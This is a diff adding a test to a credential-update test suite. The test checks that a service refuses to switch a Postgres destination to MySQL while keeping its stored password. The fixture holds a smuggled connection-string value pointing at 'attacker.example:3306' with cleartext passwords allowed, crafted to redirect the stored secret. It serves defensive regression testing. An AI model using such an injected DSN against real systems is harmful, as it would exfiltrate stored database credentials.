@@ -52,6 +52,25 @@ describe("updating a destination that has a stored password", () => {
     ).rejects.toMatchObject({ status: 400 });
   });
 
+  it("refuses another destination type with the stored password, whatever else the patch carries", async () => {
+    const { user, workspace, id, stored } = await seedPg();
+    // as MySQL, `parameters` is a target field and the Postgres destination has none: the password would follow it
+    const parameters = {
+      tls: "false",
+      x: "y@tcp(attacker.example:3306)/events?tls=false&allowCleartextPasswords=true",
+    };
+    for (const patch of [
+      { destinationType: "mysql", parameters, password: MASKED_SECRET },
+      { destinationType: "mysql", parameters },
+    ]) {
+      await expect(svc().update(user, workspace.id, "destination", id, patch)).rejects.toMatchObject({
+        status: 400,
+        message: expect.stringMatching(/destinationType changed/),
+      });
+    }
+    expect(await stored()).toMatchObject({ destinationType: "postgres", password: "hunter2" });
+  });
+
   it("accepts a new host together with a new password", async () => {
     const { user, workspace, id, stored } = await seedPg();
     await svc().update(user, workspace.id, "destination", id, { host: "new.customer.com", password: "fresh-secret" });
